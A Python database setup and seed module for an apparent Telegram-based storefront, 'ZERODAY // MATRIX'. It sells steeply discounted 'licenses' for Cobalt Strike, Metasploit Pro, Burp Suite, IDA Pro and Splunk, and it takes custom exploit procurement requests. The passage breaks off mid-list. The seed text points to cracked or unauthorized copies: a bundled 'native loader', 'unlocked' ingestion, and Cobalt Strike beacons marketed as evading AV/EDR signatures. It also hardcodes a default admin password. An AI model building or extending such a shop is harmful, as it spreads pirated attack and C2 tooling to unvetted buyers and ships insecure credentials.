import json
import os
import random
import secrets
from datetime import datetime, timedelta
from werkzeug.security import generate_password_hash

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cyber.db")


def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=30.0, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA busy_timeout=30000;")
    conn.execute("PRAGMA foreign_keys=ON;")
    return conn


import sqlite3


def init_db():
    conn = get_db()
    conn.execute("PRAGMA journal_mode=WAL;")
    cur = conn.cursor()

    # 1. Global Settings Table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL
    )
    """)

    # 2. Users & Operators Auth Table (RBAC: ADMIN / CUSTOMER)
    cur.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        email TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role TEXT NOT NULL DEFAULT 'CUSTOMER',
        telegram_handle TEXT NOT NULL DEFAULT '',
        api_token TEXT NOT NULL DEFAULT '',
        is_active INTEGER NOT NULL DEFAULT 1,
        last_login_at TEXT NOT NULL DEFAULT '',
        created_at TEXT NOT NULL
    )
    """)

    # 2b. Banned Hardware & Network Identifiers
    cur.execute("""
    CREATE TABLE IF NOT EXISTS banned_clients (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT NOT NULL DEFAULT '',
        ip_address TEXT NOT NULL DEFAULT '',
        device_hwid TEXT NOT NULL DEFAULT '',
        reason TEXT NOT NULL DEFAULT 'Administrative sanction',
        banned_at TEXT NOT NULL
    )
    """)

    # 3. Security Audit Logs Table (Login attempts, Admin actions, License unlocks)
    cur.execute("""
    CREATE TABLE IF NOT EXISTS auth_audit_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT NOT NULL,
        action TEXT NOT NULL,
        ip_address TEXT NOT NULL DEFAULT '127.0.0.1',
        details TEXT NOT NULL DEFAULT '',
        created_at TEXT NOT NULL
    )
    """)

    # 4. Digital Products & Licenses Table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS products (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sku TEXT UNIQUE NOT NULL,
        name TEXT NOT NULL,
        slug TEXT UNIQUE NOT NULL,
        category TEXT NOT NULL,
        product_type TEXT NOT NULL DEFAULT 'LICENSE_KEY',
        price REAL NOT NULL DEFAULT 0.0,
        retail_price REAL NOT NULL DEFAULT 0.0,
        version TEXT NOT NULL DEFAULT 'v2026.1',
        license_duration TEXT NOT NULL DEFAULT '1-Year Pro License',
        platform TEXT NOT NULL DEFAULT 'Windows / Linux / macOS',
        short_desc TEXT NOT NULL,
        description TEXT NOT NULL DEFAULT '',
        specs_json TEXT NOT NULL DEFAULT '[]',
        faq_json TEXT NOT NULL DEFAULT '[]',
        sha256_hash TEXT NOT NULL DEFAULT '',
        download_url TEXT NOT NULL DEFAULT '',
        badge_text TEXT NOT NULL DEFAULT 'INSTANT DELIVERY',
        featured INTEGER NOT NULL DEFAULT 0,
        views_count INTEGER NOT NULL DEFAULT 0,
        created_at TEXT NOT NULL
    )
    """)

    # 5. Cybersecurity News & Blog Posts Table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS posts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        title TEXT NOT NULL,
        slug TEXT UNIQUE NOT NULL,
        category TEXT NOT NULL,
        severity TEXT NOT NULL DEFAULT 'CRITICAL',
        cve_id TEXT NOT NULL DEFAULT '',
        cvss_score TEXT NOT NULL DEFAULT '',
        author TEXT NOT NULL DEFAULT 'ZERO-DAY UNIT',
        read_time TEXT NOT NULL DEFAULT '6 MIN READ',
        summary TEXT NOT NULL,
        content TEXT NOT NULL,
        related_skus TEXT NOT NULL DEFAULT '',
        ad_mode TEXT NOT NULL DEFAULT 'ALL',
        ad_custom_pitch TEXT NOT NULL DEFAULT '',
        featured INTEGER NOT NULL DEFAULT 0,
        views INTEGER NOT NULL DEFAULT 0,
        published_at TEXT NOT NULL,
        image_url TEXT NOT NULL DEFAULT ''
    )
    """)

    # 6. Blog Comments / Advisory Discussions Table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS post_comments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        post_id INTEGER NOT NULL,
        user_id INTEGER,
        author_name TEXT NOT NULL,
        author_role TEXT NOT NULL DEFAULT 'OPERATOR',
        body TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'PENDING',
        created_at TEXT NOT NULL
    )
    """)

    # 7. Telegram Orders & Digital Fulfillment Table (with user_id link)
    cur.execute("""
    CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        order_number TEXT UNIQUE NOT NULL,
        user_id INTEGER,
        buyer_telegram TEXT NOT NULL,
        buyer_note TEXT NOT NULL DEFAULT '',
        total_amount REAL NOT NULL DEFAULT 0.0,
        status TEXT NOT NULL DEFAULT 'PENDING_TELEGRAM',
        items_json TEXT NOT NULL DEFAULT '[]',
        fulfilled_license_info TEXT NOT NULL DEFAULT '',
        created_at TEXT NOT NULL
    )
    """)

    # Ensure user_id column exists if upgrading from an older orders table
    order_cols = [r["name"] for r in cur.execute("PRAGMA table_info(orders)").fetchall()]
    if "user_id" not in order_cols:
        cur.execute("ALTER TABLE orders ADD COLUMN user_id INTEGER;")

    # Ensure device_hwid and last_ip exist on users table
    user_cols = [r["name"] for r in cur.execute("PRAGMA table_info(users)").fetchall()]
    if "device_hwid" not in user_cols:
        cur.execute("ALTER TABLE users ADD COLUMN device_hwid TEXT NOT NULL DEFAULT '';")
    if "last_ip" not in user_cols:
        cur.execute("ALTER TABLE users ADD COLUMN last_ip TEXT NOT NULL DEFAULT '';")

    # Ensure dedicated SEO & media columns exist for products
    prod_cols = [r["name"] for r in cur.execute("PRAGMA table_info(products)").fetchall()]
    if "image_url" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN image_url TEXT NOT NULL DEFAULT '';")
    if "meta_title" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN meta_title TEXT NOT NULL DEFAULT '';")
    if "meta_desc" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN meta_desc TEXT NOT NULL DEFAULT '';")
    if "meta_keywords" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN meta_keywords TEXT NOT NULL DEFAULT '';")
    if "og_image" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN og_image TEXT NOT NULL DEFAULT '';")
    if "ad_headline" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN ad_headline TEXT NOT NULL DEFAULT '';")
    if "ad_description" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN ad_description TEXT NOT NULL DEFAULT '';")
    if "ad_badge" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN ad_badge TEXT NOT NULL DEFAULT '';")
    if "ad_cta_text" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN ad_cta_text TEXT NOT NULL DEFAULT '';")
    if "ad_image_url" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN ad_image_url TEXT NOT NULL DEFAULT '';")
    if "faq_json" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN faq_json TEXT NOT NULL DEFAULT '[]';")
    if "description" not in prod_cols:
        cur.execute("ALTER TABLE products ADD COLUMN description TEXT NOT NULL DEFAULT '';")

    # Populate realistic default FAQs for products with empty faq_json
    default_faqs_map = {
        "LIC-BURP-PRO": [
            {
                "q": "What modules and capabilities are unlocked in this Burp Suite Pro license?",
                "a": "Includes the full automated vulnerability scanner, unthrottled Intruder threads, private Burp Collaborator OAST server integration, DOM Invader, and complete BApp Store Pro extension access without runtime restrictions."
            },
            {
                "q": "Can I operate this license in an airgapped or disconnected testing lab?",
                "a": "Yes. Standalone activation manifests are fully supported. The suite requires zero recurring cloud phone-home callbacks or SaaS telemetry check-ins."
            },
            {
                "q": "How are major build updates (v2026.x) provided?",
                "a": "Operators receive verified update packages and signed binaries for 1 full calendar year directly through our encrypted Telegram concierge desk and operator vault."
            },
            {
                "q": "What host architectures are supported?",
                "a": "Native runtime support is guaranteed for Windows 10/11 (x64), Linux distributions (Debian, Ubuntu, Kali, Arch), and macOS (Apple Silicon M1/M2/M3/M4 & Intel x86_64)."
            }
        ],
        "LIC-COBALT-STRIKE": [
            {
                "q": "Does this release include the Malleable C2 profiles and sleep obfuscation kits?",
                "a": "Yes. Equipped with full sleep obfuscation kits, the Malleable C2 parsing engine, custom beacon artifact generators, and modular external C2 socket protocols."
            },
            {
                "q": "Is the Cobalt Strike teamserver capable of multi-operator access?",
                "a": "Yes. Multiple operators can connect simultaneously to the airgapped teamserver instance with role-based access control, synchronized event logs, and credential vaults."
            },
            {
                "q": "How clean are compiled beacon artifacts from public AV/EDR signatures?",
                "a": "Artifacts are compiled with clean entropy profiles and modular loader templates. Operators can also integrate custom sleep masks and shellcode obfuscation."
            },
            {
                "q": "What dispatch and verification details are provided?",
                "a": "Orders are fulfilled via encrypted Telegram dispatch with binary SHA-256 verification hashes and teamserver configuration manifests."
            }
        ],
        "LIC-IDA-HEX": [
            {
                "q": "Which Hex-Rays Decompiler architectures are included?",
                "a": "Includes Hex-Rays decompilers for x86, x64, ARM, and ARM64 architectures, along with full IDC and Python scripting support."
            },
            {
                "q": "Does this require an online license server or hardware dongle?",
                "a": "No hardware dongle or vendor telemetry is required. The license is provisioned for offline standalone reverse engineering enclaves."
            },
            {
                "q": "Can I run IDA Pro on Linux and Windows?",
                "a": "Yes, both native Linux (ELF64) and Windows binaries are provided in the dispatch bundle."
            }
        ],
        "LIC-MSF-PRO": [
            {
                "q": "What distinguishes Metasploit Pro from the community framework?",
                "a": "Metasploit Pro features automated multi-step attack chains, dynamic payload generation against modern EDRs, Layer-2/3 VPN pivoting, and comprehensive audit compliance reporting."
            },
            {
                "q": "Is the web-based team console and API access enabled?",
                "a": "Yes. Multi-user web console, REST API endpoints, and workspace collaboration features are fully unlocked."
            }
        ],
        "LIC-SPLUNK-ENT": [
            {
                "q": "Is there any daily ingestion limit or trial expiration?",
                "a": "No daily indexing caps (unlimited GB/day ingestion) and no trial expiration. Includes Enterprise Security (ES) premium app correlation rules."
            },
            {
                "q": "Can I deploy this in Docker, Kubernetes, or bare metal Linux?",
                "a": "Fully compatible with RHEL, Ubuntu, Debian, Docker containers, and multi-node indexer clusters."
            }
        ],
        "LIC-NESSUS-PRO": [
            {
                "q": "Does this license include unlimited IP scanning?",
                "a": "Yes. Uncapped IP address scanning targets without the 16-IP limit of Essentials, with continuous CVE plugin updates."
            },
            {
                "q": "Can Nessus Pro be deployed in airgapped environments?",
                "a": "Yes, offline plugin tarball archives and custom audit compliance templates are fully supported."
            }
        ]
    }
    cur.execute("SELECT id, sku, faq_json FROM products")
    for prod_row in cur.fetchall():
        p_id = prod_row["id"]
        p_sku = prod_row["sku"]
        p_faq = prod_row["faq_json"]
        if not p_faq or p_faq == "[]":
            faqs = default_faqs_map.get(p_sku)
            if not faqs:
                faqs = [
                    {
                        "q": "What deployment format is provided upon order verification?",
                        "a": "Upon concierge payment verification via Telegram, you receive a cryptographically signed license key, installation instructions, and permanent offline mirror access."
                    },
                    {
                        "q": "Does this software require constant internet connectivity or telemetry check-ins?",
                        "a": "No. All licensed assets are pre-verified for standalone operational isolation and zero telemetry phone-home."
                    },
                    {
                        "q": "What is your warranty and support policy?",
                        "a": "Every license key comes with a 100% activation guarantee and active maintenance support throughout the contracted validity duration."
                    }
                ]
            cur.execute("UPDATE products SET faq_json = ? WHERE id = ?", (json.dumps(faqs), p_id))

    default_desc_map = {
        "LIC-BURP-PRO": """### 01 · ARCHITECTURAL CAPABILITIES & SCANNING PIPELINE

Burp Suite Professional represents the industry-benchmark web security assessment toolkit. The core engine is built on an asynchronous non-blocking event loop engineered to handle dynamic single-page applications, multi-stage authentication handshakes, and nested API schemas.

> [!NOTE]
> All automated active vulnerability checks employ non-destructive delta-probing to safeguard target system stability before confirming vulnerability presence.

---

### 02 · ENTERPRISE MODULE BREAKDOWN

| Security Subsystem | Core Capability | Operational Pipeline |
| :--- | :--- | :--- |
| **Burp Scanner** | Automated active/passive inspection across OWASP Top 10 | Headless Chromium + IAST Engine |
| **Turbo Intruder** | High-throughput race condition & fuzzing attack vectors | Custom Python unthrottled worker pool |
| **DOM Invader** | Advanced client-side DOM XSS dissection & sink analysis | Real-time taint tracking |
| **Collaborator Client** | Private out-of-band application security testing (OAST) | Encrypted DNS / HTTPS payload beacons |

---

### 03 · HEADLESS CI/CD AUTOMATION EXECUTION

Security operators can integrate Burp Suite directly into headless verification workflows:

```bash
# Dispatch headless scan job against internal staging microservices
curl -X POST "http://127.0.0.1:1337/v0.1/scan" \\
  -H "Authorization: Bearer $OPERATOR_TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{"urls": ["https://target.staging.internal/api/v2"], "scan_configurations": [{"name": "Crawl and audit - deep"}]}'
```

> [!TIP]
> Compatible with disconnected air-gapped enclaves with zero external license server callbacks.""",

        "LIC-COBALT-STRIKE": """### 01 · ADVERSARY EMULATION & C2 PIPELINE

Cobalt Strike is an enterprise penetration testing software designed to replicate post-exploitation tactics, techniques, and procedures (TTPs) of sophisticated threat actors. The platform decouples teamserver orchestration from operator client terminals.

> [!WARNING]
> Usage is strictly restricted to authorized offensive security operations governed by explicit rules of engagement.

---

### 02 · MALLEABLE C2 & MEMORY EVASION SUBSYSTEMS

The Beacon payload incorporates modular memory evasion hooks and customized traffic profile disguises:

- **Sleep Mask Hooks**: Obfuscates beacon memory footprint and executable allocations during sleep intervals to circumvent memory scanner heuristics.
- **Malleable C2 Parsing**: Wraps command-and-control telemetry inside valid web protocols (HTTPS, DNS, HTTP/2).
- **Process Injection**: Employs early-bird APC injection and remote section mapping against modern endpoint detection platforms.

---

### 03 · TEAMSERVER PROVISIONING

```bash
# Provision isolated teamserver instance
./teamserver 10.10.14.5 "MasterPassword2026!" /opt/matrix/profiles/c2_malleable_v4.profile
```

> [!NOTE]
> All operator engagements are recorded in immutable audit logs with real-time screen and keystroke telemetry.""",

        "LIC-IDA-HEX": """### 01 · BINARY ANALYSIS & DECOMPILATION ARCHITECTURE

IDA Pro with the Hex-Rays Decompiler suite provides the gold-standard environment for binary reverse engineering, malware analysis, and zero-day vulnerability discovery.

---

### 02 · INCLUDED HEX-RAYS DECOMPILER ENGINES

- **x86 & x64 Decompilers**: Transforms compiled machine instructions into structured, C-like pseudocode.
- **ARM & ARM64 (AArch64)**: Seamless decompilation of iOS, Android, and embedded firmware targets.
- **Microcode Optimization Pipeline**: Multi-pass microcode analysis simplifying obfuscated control flows and eliminating dead code branches.
- **IDAPython Integration**: Full Python 3 API for automated type recovery, struct reconstruction, and signature generation.

---

### 03 · AUTOMATION SCRIPTING EXAMPLE

```python
import idaapi
import idc

# Enumerate all detected function boundaries and cross-references
for ea in idautils.Functions():
    flags = idc.get_func_flags(ea)
    if not (flags & FUNC_LIB):
        name = idc.get_func_name(ea)
        print(f"Audit Function: {name} at {hex(ea)}")
```

> [!TIP]
> Shipped with offline checksum verification manifests for high-security analytical laboratories.""",

        "LIC-MSF-PRO": """### 01 · PENETRATION TESTING & EXPLOITATION FRAMEWORK

Metasploit Pro extends the open-source framework with automated exploitation engines, comprehensive network discovery, smart credential harvesting, and enterprise compliance reporting.

---

### 02 · CORE CAPABILITIES & NETWORK PIVOTING

- **Smart Credential Vault**: Aggregates cleartext credentials, hashes, and Kerberos tickets across compromised hosts.
- **Layer 2/3 VPN Pivoting**: Routes complete network diagnostic and scanning traffic directly through compromised Meterpreter sessions without local agent installations.
- **Automated Phishing Simulator**: Campaigns with dynamic tracking portals, credential harvesting, and awareness telemetry.
- **Executive PDF Reporting**: Generates FISMA, PCI-DSS, and HIPAA executive compliance audits with a single click.""",

        "LIC-SPLUNK-ENT": """### 01 · SECURITY INFORMATION & EVENT MANAGEMENT (SIEM)

Splunk Enterprise paired with Enterprise Security (ES) provides enterprise-wide log aggregation, security correlation, and threat detection across cloud, hybrid, and on-premises infrastructure.

---

### 02 · UNLOCKED INGESTION & DETECTION ENGINEERING

- **Unlimited Ingestion Volume**: Uncapped gigabytes per day indexing with zero license expiration countdowns.
- **Enterprise Security (ES)**: Pre-configured correlation searches mapped against the MITRE ATT&CK enterprise matrix.
- **Risk-Based Alerting (RBA)**: Dynamically correlates low-fidelity telemetry into high-confidence actionable incidents."""
    }

    cur.execute("SELECT id, sku, description FROM products")
    for prod_row in cur.fetchall():
        p_id = prod_row["id"]
        p_sku = prod_row["sku"]
        p_desc = prod_row["description"]
        if not p_desc or not p_desc.strip():
            d_text = default_desc_map.get(p_sku)
            if not d_text:
                d_text = "### 01 · TECHNICAL SPECIFICATIONS & OPERATIONAL CAPABILITIES\n\nComprehensive commercial cybersecurity software license engineered for authorized security operators, threat intelligence analysts, and red team engineers.\n\n> [!NOTE]\n> Verified for disconnected airgap isolation with zero SaaS telemetry callbacks.\n\n---\n\n### 02 · DEPLOYMENT MATRIX\n\n- **Platform Support**: Enterprise multi-platform support.\n- **Delivery Pipeline**: Cryptographically signed release archive dispatched via encrypted Telegram concierge."
            cur.execute("UPDATE products SET description = ? WHERE id = ?", (d_text, p_id))

    # Ensure dedicated SEO columns exist for posts
    post_cols = [r["name"] for r in cur.execute("PRAGMA table_info(posts)").fetchall()]
    if "meta_title" not in post_cols:
        cur.execute("ALTER TABLE posts ADD COLUMN meta_title TEXT NOT NULL DEFAULT '';")
    if "meta_desc" not in post_cols:
        cur.execute("ALTER TABLE posts ADD COLUMN meta_desc TEXT NOT NULL DEFAULT '';")
    if "meta_keywords" not in post_cols:
        cur.execute("ALTER TABLE posts ADD COLUMN meta_keywords TEXT NOT NULL DEFAULT '';")
    if "og_image" not in post_cols:
        cur.execute("ALTER TABLE posts ADD COLUMN og_image TEXT NOT NULL DEFAULT '';")
    if "ad_count" not in post_cols:
        cur.execute("ALTER TABLE posts ADD COLUMN ad_count INTEGER NOT NULL DEFAULT 1;")
    if "ad_placement" not in post_cols:
        cur.execute("ALTER TABLE posts ADD COLUMN ad_placement TEXT NOT NULL DEFAULT 'MIDDLE';")
    if "ad_paragraph_interval" not in post_cols:
        cur.execute("ALTER TABLE posts ADD COLUMN ad_paragraph_interval INTEGER NOT NULL DEFAULT 4;")

    # Ensure status column exists for post_comments (moderation workflow)
    comment_cols = [r["name"] for r in cur.execute("PRAGMA table_info(post_comments)").fetchall()]
    if "status" not in comment_cols:
        cur.execute("ALTER TABLE post_comments ADD COLUMN status TEXT NOT NULL DEFAULT 'PENDING';")
        cur.execute("UPDATE post_comments SET status = 'APPROVED';")

    # 8. Analytics Pageviews & Dwell Time Table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS analytics_pageviews (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        visit_token TEXT UNIQUE NOT NULL,
        visitor_id TEXT NOT NULL,
        session_id TEXT NOT NULL,
        page_type TEXT NOT NULL,
        target_slug TEXT NOT NULL DEFAULT '',
        target_title TEXT NOT NULL DEFAULT '',
        duration_seconds INTEGER NOT NULL DEFAULT 0,
        max_scroll_pct INTEGER NOT NULL DEFAULT 0,
        referrer TEXT NOT NULL DEFAULT 'Direct',
        device_type TEXT NOT NULL DEFAULT 'Desktop',
        os_name TEXT NOT NULL DEFAULT 'Linux',
        created_at TEXT NOT NULL,
        last_ping_at TEXT NOT NULL
    )
    """)

    # 9. Analytics Events & Smart Ad Funnel Table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS analytics_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        visitor_id TEXT NOT NULL,
        session_id TEXT NOT NULL,
        event_type TEXT NOT NULL,
        source_page TEXT NOT NULL DEFAULT '',
        target_sku TEXT NOT NULL DEFAULT '',
        meta_info TEXT NOT NULL DEFAULT '',
        created_at TEXT NOT NULL
    )
    """)

    # 10. Verified Product Reviews & Operational Assessments Table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS product_reviews (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        product_id INTEGER,
        product_sku TEXT NOT NULL DEFAULT '',
        author_name TEXT NOT NULL,
        author_role TEXT NOT NULL DEFAULT 'Enterprise Security Operator',
        author_org TEXT NOT NULL DEFAULT 'Verified Entity',
        rating INTEGER NOT NULL DEFAULT 5,
        title TEXT NOT NULL DEFAULT '',
        content TEXT NOT NULL,
        verified_badge TEXT NOT NULL DEFAULT '● VERIFIED LICENSE DEPLOYMENT',
        featured_manifesto INTEGER NOT NULL DEFAULT 0,
        created_at TEXT NOT NULL
    )
    """)

    # 11. Custom Tool Sourcing & Exploit Procurement Requests Table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS tool_requests (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        request_id TEXT UNIQUE NOT NULL,
        user_id INTEGER,
        tool_name TEXT NOT NULL,
        category TEXT NOT NULL DEFAULT 'EXPLOIT_TOOLKIT',
        contact_telegram TEXT NOT NULL,
        contact_email TEXT NOT NULL DEFAULT '',
        preferred_contact TEXT NOT NULL DEFAULT 'TELEGRAM',
        urgency TEXT NOT NULL DEFAULT 'STANDARD',
        budget_range TEXT NOT NULL DEFAULT 'FLEXIBLE',
        technical_specs TEXT NOT NULL DEFAULT '',
        status TEXT NOT NULL DEFAULT 'PENDING',
        admin_notes TEXT NOT NULL DEFAULT '',
        ip_address TEXT NOT NULL DEFAULT '127.0.0.1',
        created_at TEXT NOT NULL,
        updated_at TEXT NOT NULL
    )
    """)

    conn.commit()
    seed_if_empty(conn)
    conn.close()


def seed_if_empty(conn):
    cur = conn.cursor()
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 1. Seed Default Settings
    default_settings = {
        "site_name": "ZERODAY // MATRIX",
        "site_tagline": "ENTERPRISE CYBERSECURITY LICENSES, RED TEAM TOOLS & ZERO-DAY THREAT INTEL",
        "telegram_user": "ZeroDayMatrixSupport",
        "telegram_channel": "https://t.me/ZeroDayMatrixChannel",
        "ticker_text": "⚡ [CVE-2026-8841 CRITICAL 9.8] OAUTH2 TOKEN SMUGGLING IN ENTERPRISE GATEWAYS // NEW DROP: BURP SUITE PRO v2026.10 & METASPLOIT PRO ENTERPRISE SEATS AVAILABLE VIA TELEGRAM // INSTANT ACTIVATION",
        "hero_badge": "VERIFIED ENTERPRISE SECURITY ARSENAL & THREAT INTELLIGENCE",
        "hero_title": "COMMERCIAL OFFENSIVE & SIEM LICENSES. ZERO RETAIL OVERHEAD.",
        "hero_subtitle": "Deploy activated Burp Suite Professional, Metasploit Pro, Splunk Enterprise Security, and custom Red Team toolkits. Authenticated operator vault with instant license provisioning via Telegram.",
        "hero_cta_primary": "EXPLORE ARSENAL →",
        "hero_cta_primary_url": "/shop",
        "hero_cta_secondary": "THREAT JOURNAL →",
        "hero_cta_secondary_url": "/journal",
        "telegram_msg_prefix": "Hello ZeroDay Matrix! I want to purchase and activate the following order:",
        "footer_disclaimer": "ALL DIGITAL LICENSES AND RESEARCH TOOLS ARE PROVIDED FOR AUTHORIZED SECURITY AUDITING, PENETRATION TESTING, AND DEFENSIVE SOC OPERATIONS ONLY.",
        "category_strip_text": "ALL SYSTEMS // WEB & APPSEC // OFFENSIVE & RED TEAM // SIEM & BLUE TEAM // REVERSE ENGINEERING // OSINT & RECON",
        "home_featured_product_1": "22",
        "home_featured_product_2": "23",
        "home_featured_product_3": "24",
        "home_featured_product_4": "25",
        "home_featured_post_1": "9",
        "home_featured_post_2": "10",
        "home_featured_post_3": "11",
        "home_featured_post_4": "12",
        "cat_chip_all": "ALL SYSTEMS",
        "cat_chip_web": "WEB & APPSEC",
        "cat_chip_offensive": "OFFENSIVE & RED TEAM",
        "cat_chip_siem": "SIEM & BLUE TEAM",
        "cat_chip_re": "REVERSE ENGINEERING",
        "cat_chip_osint": "OSINT & RECON"
    }
    for k, v in default_settings.items():
        cur.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))

    # 2. Seed Default Admin & Demo Customer Accounts
    cur.execute("SELECT COUNT(*) FROM users")
    if cur.fetchone()[0] == 0:
        users_seed = [
            (
                "admin",
                "admin@zerodaymatrix.io",
                generate_password_hash("Admin@2026"),
                "ADMIN",
                "@ZeroDayMatrixSupport",
                "zd_live_admin_" + secrets.token_hex(12),
                1,
                now_str,
                now_str
            ),
            (
                "redteam_operator",
                "operator@redteam.sec",
                generate_password_hash("Operator@2026"),
                "CUSTOMER",
                "@redteam_lead_eu",
                "zd_live_op_" + secrets.token_hex(12),
                1,
                now_str,
                now_str
            )
        ]
        cur.executemany("""
        INSERT INTO users (
            username, email, password_hash, role, telegram_handle,
            api_token, is_active, last_login_at, created_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, users_seed)

        cur.execute("""
        INSERT INTO auth_audit_logs (user_id, username, action, ip_address, details, created_at)
        VALUES (1, 'admin', 'SYSTEM_INIT', '127.0.0.1', 'Provisioned master admin and security schema', ?)
        """, (now_str,))

    # Enforce strictly: In-built account (id=1, username='admin') is the ONLY admin; all others are CUSTOMER or MODERATOR
    cur.execute("UPDATE users SET role = 'ADMIN' WHERE id = 1 AND LOWER(username) = 'admin'")
    cur.execute("UPDATE users SET role = 'CUSTOMER' WHERE id != 1 AND role NOT IN ('MODERATOR', 'CUSTOMER')")

    # 3. Seed Digital Products
    cur.execute("SELECT COUNT(*) FROM products")
    if cur.fetchone()[0] == 0:
        products_seed = [
            (
                "LIC-BURP-PRO",
                "Burp Suite Professional (v2026.10)",
                "burp-suite-professional-license",
                "Web & AppSec Licenses",
                "LICENSE_KEY",
                149.0,
                475.0,
                "v2026.10 Stable + Early Adopter",
                "1-Year Pro License (Multi-Device)",
                "Windows / Linux / macOS (x64 & ARM64)",
                "Full Enterprise Web Vulnerability Scanner, Unthrottled Intruder, Burp Collaborator Private Server support, BApp Store Pro extensions, and DOM Invader.",
                json.dumps([
                    "Automated Active & Passive Web Vulnerability Scanner (OWASP Top 10 + API Fuzzing)",
                    "Unthrottled Burp Intruder with custom payload processors & grep extractors",
                    "Full access to Burp Collaborator & OAST out-of-band vulnerability detection",
                    "All Pro-only BApp Store Extensions (Autorize, Turbo Intruder, Param Miner, J2EEScan)",
                    "Project file save/restore, HTML/XML compliance reporting & CI/CD CLI runner",
                    "Includes native loader + dedicated license key valid for 12 months with updates"
                ]),
                "8f4e2b91a04d7c12e9f01a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d",
                "",
                "BESTSELLER // SAVE 68%",
                1,
                342,
                now_str
            ),
            (
                "LIC-MSF-PRO",
                "Metasploit Pro Enterprise Edition",
                "metasploit-pro-enterprise-license",
                "Red Team & Exploitation",
                "LICENSE_KEY",
                299.0,
                15000.0,
                "v6.4.x Pro Commercial",
                "1-Year Enterprise Seat",
                "Linux (Ubuntu/Kali/Debian) & Windows Server",
                "Commercial penetration testing framework with automated exploitation chains, smart VPN pivoting, dynamic payload evasion (AV/EDR bypass), and phishing campaign manager.",
                json.dumps([
                    "Automated Exploitation & Smart Credential Reuse across segmented subnets",
                    "Dynamic Payload Generator with polymorphic C/ASM stage encoding against EDR",
                    "Layer-2/Layer-3 VPN Pivoting directly through compromised Meterpreter sessions",
                    "Integrated Social Engineering & Spear-Phishing Campaign Automation GUI",
                    "Web Application Vulnerability Scanner + OWASP Audit Reporting Engine",
                    "Multi-user team collaboration server with XML/PDF executive report exports"
                ]),
                "3c9a1d84e7f6b5a4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0",
                "",
                "SAVE 98% // RED TEAM CORE",
                1,
                289,
                now_str
            ),
            (
                "LIC-SPLUNK-ENT",
                "Splunk Enterprise + Enterprise Security (ES)",
                "splunk-enterprise-security-license",
                "SIEM & Blue Team",
                "LICENSE_KEY",
                349.0,
                8500.0,
                "v9.3 Enterprise + ES 8.0",
                "Perpetual / Unlimited Indexing Key",
                "Linux (RHEL/Ubuntu/Docker) & Windows",
                "Full SIEM & SOC analytics engine with unlocked daily ingestion volume, Splunk Enterprise Security (ES) correlation searches, MITRE ATT&CK matrix mapping, and SOAR playbooks.",
                json.dumps([
                    "Unlocked Daily Indexing Volume (No 500MB/day trial restriction or license violation lockouts)",
                    "Includes Splunk Enterprise Security (ES) Premium App & Risk-Based Alerting (RBA)",
                    "Pre-loaded with 650+ MITRE ATT&CK Correlation Searches & Threat Intelligence Framework",
                    "Full Clustering, Forwarder Management, Machine Learning Toolkit (MLTK) & Dashboards",
                    "Ideal for Purple Team Detection Engineering labs, MSSPs, and Production SOCs"
                ]),
                "7a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b",
                "",
                "SOC / SIEM UNLOCKED",
                1,
                215,
                now_str
            ),
            (
                "LIC-ACUNETIX-PRO",
                "Acunetix 360 / Invicti Enterprise Scanner",
                "acunetix-enterprise-web-scanner",
                "Web & AppSec Licenses",
                "LICENSE_KEY",
                179.0,
                4500.0,
                "v26.4 Unlimited Targets",
                "1-Year Unlimited Targets",
                "Windows / Linux / Docker Container",
                "Automated DAST + IAST web application security scanner with Proof-Based Scanning, DeepScan headless Chromium engine for SPAs/GraphQL, and AcuSensor integration.",
                json.dumps([
                    "Unlimited Target Domains & Subdomains scanning with concurrent worker threads",
                    "AcuMonitor Out-of-Band (OOB) automatic detection for Blind SSRF, XXE, and SQLi",
                    "DeepScan JavaScript/SPA crawler supporting React, Angular, Vue, REST & GraphQL APIs",
